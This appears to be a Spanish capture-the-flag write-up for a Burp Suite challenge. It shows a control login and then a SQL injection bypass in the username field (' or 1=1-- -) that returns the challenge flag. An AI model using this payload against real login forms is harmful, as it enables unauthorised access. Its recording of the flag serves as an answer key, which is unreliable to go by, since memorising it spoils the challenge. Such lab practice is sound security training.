@@ -1,0 +1,35 @@
+DESAFÍO BURP SUITE - "La FLAG perdida"
+Objetivo: http://desafiouls.free.nf/  (login POST a index.php)
+Campos del formulario: username (texto) + password (password)
+========================================================================
+
+NOTA: el sitio está detrás del anti-bot por JavaScript de InfinityFree
+(aes.js + cookie __test). Un simple curl se queda en esa pantalla; hay que
+entrar con un navegador real que ejecute el JS para llegar al login.
+
+------------------------------------------------------------------------
+PETICIÓN 1 - Login normal (control)
+------------------------------------------------------------------------
+POST /index.php
+username=test
+password=test123
+
+Respuesta: HTTP 200, 1371 bytes. Vuelve el formulario, NO aparece flag.
+=> credenciales inválidas, acceso denegado.
+
+------------------------------------------------------------------------
+PETICIÓN 2 - Inyección SQL en el campo username (bypass de login)
+------------------------------------------------------------------------
+POST /index.php
+username=' or 1=1-- -
+password=x
+
+Respuesta: HTTP 200, 1155 bytes. Texto visible:
+    Acceso Concedido
+    Flag encontrada: CTF{PHP_SQLi_Byp4ss_M4st3r}
+    ¡Inyección exitosa!
+
+========================================================================
+FLAG: CTF{PHP_SQLi_Byp4ss_M4st3r}
+Técnica: SQL Injection - autenticación bypass ( ' OR 1=1 -- - )
+Pista 3 del desafío: ('or 1=1-- -)
